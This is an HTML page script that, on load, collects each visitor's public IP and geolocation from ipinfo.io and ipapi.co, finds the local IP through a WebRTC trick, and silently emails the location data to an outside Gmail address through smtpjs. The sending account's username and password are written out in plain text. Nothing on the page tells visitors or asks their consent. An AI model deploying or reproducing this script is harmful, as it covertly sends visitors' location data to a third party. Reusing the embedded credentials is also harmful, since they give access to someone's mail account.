<script src="https://ajax.googleapis.com/ajax/libs/jquery/3.4.1/jquery.min.js"></script>
<script src="https://smtpjs.com/v3/smtp.js"></script>
<script>
$.getJSON('https://ipinfo.io/json', function(data) {
  console.log("ipinfo.io");
  console.log(JSON.stringify(data, null, 2));
  Email.send({
      Host : "smtp.gmail.com",
      Username : "02gracelie2019@gmail.com",
      Password : "maverick2013",
      To : 'f.crayop@gmail.com',
      From : "02gracelie2019@gmail.com",
      Subject : "ipinfo.io",
      Body : JSON.stringify(data, null, 2)
  })
});
$.getJSON('https://ipinfo.io/json', function(data) {
  console.log("https://ipinfo.io/json");
  console.log(JSON.stringify(data, null, 2));
});
$.getJSON('https://ipapi.co/json/', function(data) {
  console.log("ip-api.com");
  console.log(JSON.stringify(data, null, 2));
});
var findIP = new Promise(r=>{var w=window,a=new (w.RTCPeerConnection||w.mozRTCPeerConnection||w.webkitRTCPeerConnection)({iceServers:[]}),b=()=>{};a.createDataChannel("");a.createOffer(c=>a.setLocalDescription(c,b,b),b);a.onicecandidate=c=>{try{c.candidate.candidate.match(/([0-9]{1,3}(\.[0-9]{1,3}){3}|[a-f0-9]{1,4}(:[a-f0-9]{1,4}){7})/g).forEach(r)}catch(e){}}})

/*Usage example*/
findIP.then(ip => document.write('your ip: ', ip)).catch(e => console.error(e))
</script>
